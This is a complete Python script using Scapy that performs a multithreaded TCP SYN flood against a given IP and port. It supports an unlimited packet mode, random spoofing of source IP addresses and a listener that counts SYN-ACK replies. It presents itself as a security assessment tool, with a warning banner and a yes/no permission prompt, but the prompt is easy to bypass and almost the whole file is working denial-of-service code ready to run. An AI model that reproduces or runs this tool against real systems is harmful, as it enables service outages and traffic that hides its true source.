#!/usr/bin/env python3
"""
Multithreaded SYN Flood Testing Tool for Network Security Assessment
IMPORTANT: Only use on networks you own or have explicit permission to test.
"""

import argparse
import sys
import time
import random
import threading
from queue import Queue
from scapy.all import IP, TCP, send, sniff, conf, RandShort


def generate_random_ip():
    """Generate a random source IP address.

    Returns:
        str: Randomly generated IPv4 address in dotted-quad format.
    """
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}." \
           f"{random.randint(1, 254)}.{random.randint(1, 254)}"


def worker(target_ip, target_port, delay, counter, total_packets, spoof_ip):
    """Worker thread function for sending SYN packets.

    Continuously crafts and sends TCP SYN packets to the target host,
    optionally spoofing the source IP, until the specified packet count
    is reached.

    Args:
        target_ip (str): Target host IP address.
        target_port (int): Target TCP port number.
        delay (float): Delay between packet sends in seconds.
        counter (list of int): Shared mutable counter of packets sent.
        total_packets (int): Total number of packets to send (0 for unlimited).
        spoof_ip (bool): Whether to spoof the source IP address.

    Raises:
        Exception: If an error occurs during packet crafting or sending.
    """
    try:
        while True:
            # Generate source IP and port
            source_ip = generate_random_ip() if spoof_ip else None
            source_port = RandShort()  # Random source port

            # Create the SYN packet
            syn_packet = IP(dst=target_ip, src=source_ip) / TCP(
                sport=source_port,
                dport=target_port,
                flags="S",  # SYN flag
                seq=random.randint(1000, 9000),
                window=random.randint(1000, 9000)
            )

            # Send the packet
            send(syn_packet, verbose=0)

            # Increment counter and check if we've reached the limit
            with counter_lock:
                counter[0] += 1
                if total_packets > 0 and counter[0] >= total_packets:
                    break

            time.sleep(delay)

    except Exception as e:
        print(f"[!] Worker error: {e}")


def progress_monitor(counter, total_packets, response_counter=None):
    """Monitor and report progress periodically.

    Wakes every second to compute and print packet send rates and, if enabled,
    response rates based on shared counters.

    Args:
        counter (list of int): Shared mutable counter tracking packets sent.
        total_packets (int): Total number of packets to send (0 for unlimited).
        response_counter (list of int, optional): Shared mutable counter of
            SYN-ACK responses. Defaults to None.
    """
    try:
        start_time = time.time()
        last_count = 0
        last_response_count = 0

        while True:
            time.sleep(1)  # Update every second

            with counter_lock:
                current_count = counter[0]
                if total_packets > 0 and current_count >= total_packets:
                    break
                current_response_count = response_counter[0] if response_counter else 0

            # Calculate packet rate
            elapsed = time.time() - start_time
            if elapsed > 0:
                packet_rate = current_count / elapsed
                packets_since_last = current_count - last_count
                last_count = current_count

                # Calculate response rate if listening
                response_info = ""
                if response_counter:
                    responses_since_last = current_response_count - last_response_count
                    last_response_count = current_response_count
                    response_rate = (current_response_count / current_count * 100) if current_count > 0 else 0
                    response_info = (f" - Responses: {current_response_count} "
                                     f"({response_rate:.2f}%, +{responses_since_last})")

                # Print progress
                if total_packets > 0:
                    percentage = (current_count / total_packets) * 100
                    print(f"[+] Progress: {current_count}/{total_packets} packets "
                          f"({percentage:.1f}%) - Rate: {packet_rate:.2f} p/s "
                          f"(Current: {packets_since_last}/s){response_info}")
                else:
                    print(f"[+] Sent {current_count} packets - Rate: "
                          f"{packet_rate:.2f} p/s (Current: {packets_since_last}/s){response_info}")

    except Exception as e:
        print(f"[!] Monitor error: {e}")


def syn_ack_listener(target_ip, target_port, response_counter, listen_flag):
    """Listen for SYN-ACK responses from the target host.

    Args:
        target_ip (str): Target host IP to listen for responses from.
        target_port (int): Target TCP port to listen for responses from.
        response_counter (list of int): Shared mutable counter for responses.
        listen_flag (list of bool): Flag to control when to stop listening.
    """
    def packet_callback(packet):
        # Check if packet has SYN-ACK from the target
        if packet.haslayer(TCP) and packet.haslayer(IP):
            if packet[IP].src == target_ip and packet[TCP].sport == target_port:
                if packet[TCP].flags == 0x12:  # SYN-ACK flags
                    with counter_lock:
                        response_counter[0] += 1

    try:
        # Set up a filter for TCP packets from the target
        tcp_filter = f"tcp and src host {target_ip} and src port {target_port}"

        # Start sniffing in a loop that can be interrupted
        while listen_flag[0]:
            # Sniff with a short timeout to allow checking the flag
            sniff(filter=tcp_filter, prn=packet_callback, timeout=1, store=0)

    except Exception as e:
        print(f"[!] Listener error: {e}")


def syn_flood(target_ip, target_port, packet_count, delay, num_threads, spoof_ip, listen_flag):
    """Perform SYN flooding with randomized source addresses using multiple threads.

    Args:
        target_ip (str): Target host IP.
        target_port (int): Target TCP port.
        packet_count (int): Number of packets to send (0 for unlimited).
        delay (float): Delay between packets in seconds.
        num_threads (int): Number of worker threads to use.
        spoof_ip (bool): Whether to spoof source IP addresses.
        listen_flag (bool): Whether to launch a listener for SYN-ACK responses.
    """
    try:
        print(f"[*] Starting multithreaded SYN flood test targeting {target_ip}:{target_port}")
        print(f"[*] Using {num_threads} threads with {delay}s delay per packet")
        print("[*] Using spoofed IPs" if spoof_ip else "[*] Using real IP")
        if packet_count > 0:
            print(f"[*] Sending {packet_count} packets total")
        else:
            print("[*] Sending unlimited packets until interrupted")

        if listen_flag:
            print("[*] Listening for SYN-ACK responses")

        print("[*] Press CTRL+C to stop the test")

        # Shared counters for all threads (using a list to make it mutable)
        counter = [0]
        response_counter = [0]
        listen_control = [True]

        # Start worker threads
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=worker,
                                 args=(target_ip, target_port, delay, counter, packet_count, spoof_ip),
                                 daemon=True)
            threads.append(t)
            t.start()

        # Start progress monitor
        monitor_args = (counter, packet_count, response_counter) if listen_flag else (counter, packet_count)
        threading.Thread(target=progress_monitor, args=monitor_args, daemon=True).start()

        # Start listener if required
        if listen_flag:
            threading.Thread(target=syn_ack_listener,
                             args=(target_ip, target_port, response_counter, listen_control),
                             daemon=True).start()

        # Wait for workers to finish
        for t in threads:
            t.join()

        # Stop listener and show final response rate
        if listen_flag:
            listen_control[0] = False
            time.sleep(2)
            sent = counter[0]
            received = response_counter[0]
            response_rate = (received / sent * 100) if sent > 0 else 0
            print(f"[+] SYN-ACK responses: {received}/{sent} ({response_rate:.2f}%)")

        print(f"[+] SYN flood test completed. Sent {counter[0]} packets.")

    except KeyboardInterrupt:
        print(f"\n[!] Test interrupted by user. Sent {counter[0]} packets.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


def main():
    """Parse arguments and launch the SYN flood testing tool."""
    parser = argparse.ArgumentParser(
        description="Multithreaded SYN Flood Testing Tool for Network Security Assessment"
    )
    parser.add_argument("-t", "--target", required=True, help="Target host IP")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target TCP port")
    parser.add_argument("-c", "--count", type=int, default=1000,
                        help="Number of packets to send (default: 1000, 0 for unlimited)")
    parser.add_argument("-d", "--delay", type=float, default=0.01,
                        help="Delay between packets in seconds (default: 0.01)")
    parser.add_argument("-T", "--threads", type=int, default=4,
                        help="Number of worker threads (default: 4)")
    parser.add_argument("-s", "--spoof", action="store_true",
                        help="Use randomly spoofed source IP addresses")
    parser.add_argument("-l", "--listen", action="store_true",
                        help="Listen for SYN-ACK responses")
    args = parser.parse_args()

    print("""
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║        MULTITHREADED SYN FLOOD TEST TOOL          ║
    ║                                                   ║
    ║  WARNING: FOR ETHICAL TESTING PURPOSES ONLY       ║
    ║  USE ONLY ON NETWORKS YOU OWN OR                  ║
    ║  HAVE EXPLICIT PERMISSION TO TEST                 ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
    """)

    user_confirmation = input("Do you have permission to perform this test? (yes/no): ").lower()
    if user_confirmation != "yes":
        print("[!] Test aborted. Confirmation not received.")
        sys.exit(0)

    # Global lock for counter access
    global counter_lock
    counter_lock = threading.Lock()

    syn_flood(args.target, args.port, args.count, args.delay,
              args.threads, args.spoof, args.listen)


if __name__ == "__main__":
    main()
